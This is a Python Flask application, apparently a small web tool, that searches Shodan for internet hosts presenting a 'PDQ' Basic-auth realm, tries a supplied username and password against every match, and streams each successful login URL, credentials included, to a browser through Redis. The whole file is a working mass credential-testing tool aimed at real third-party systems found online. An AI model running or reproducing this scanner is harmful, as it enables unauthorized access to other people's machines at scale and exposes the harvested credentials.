import os
import threading
from time import sleep

import redis
import requests
import shodan
from dotenv import load_dotenv
from flask import Flask, Response, render_template, request

load_dotenv()

REDIS_URL = os.getenv('REDIS_URL')
REDIS_PORT = os.getenv('REDIS_PORT')
REDIS_PASSWORD = os.getenv('REDIS_PASSWORD')

app = Flask(__name__)
db = redis.Redis(host=REDIS_URL, port=REDIS_PORT, password=REDIS_PASSWORD)
query = 'WWW-Authenticate: Basic Realm="PDQ"'

#------------------------------------------------
# *                 call_api
# ?  This function makes the call to Shodan to get
# ?  query data, and publishes the results to the stream
# @param apiKey string
# @param user string
# @param passw string
# @param pageCount int
# @return string     NOTE: Only returns on error
#------------------------------------------------
def call_api(apiKey, user, passw, pageCount):
    api = shodan.Shodan(apiKey)
    # get all pages from pageCount
    page = 1
    while page <= int(pageCount):
        try:
            instances = api.search(query, page=page)
            # filter through all pages/test creds
            for instance in instances['matches']:
                try:
                    reqString = f"http://{user}:{passw}@{instance['ip_str']}:{instance['port']}"
                    res = requests.get(reqString)
                    sleep(0.5)
                    if res.status_code == 200: # successful, time to publish!
                        db.publish('updates', reqString)
                except requests.exceptions.ConnectionError as e:
                    print(f'Connection Error: {e}')
        except shodan.APIError as e:
            print(f'Error: {e}')
            return [e] # return as list due to html template looking for iterable
        page += 1


# We only need one route :)
@app.route('/', methods=['GET', 'POST'])
@app.route('/index', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        apiKey = request.form['shodan-api-key']
        user = request.form['username']
        passw = request.form['password']
        pageCount = request.form['page-count']
        bgThread = threading.Thread(target=call_api, args=[apiKey, user, passw, pageCount])
        bgThread.start()
        print('Thread started')

    return render_template('index.html')

#------------------------------------------------
# *                stream
# ?  This route is used to provide access to our events
# ?  event_stream is a generator function
# ?  that yields our results for the client
# @return Response
#------------------------------------------------
@app.route('/stream')
def stream():
    def event_stream():
        pubsub = db.pubsub()
        pubsub.subscribe('updates')
        for message in pubsub.listen():
            if message['type'] == 'message':
                yield 'data:{}\n\n'.format(message['data'].decode())
    return Response(event_stream(), mimetype='text/event-stream')

if __name__ == '__main__':
    app.run()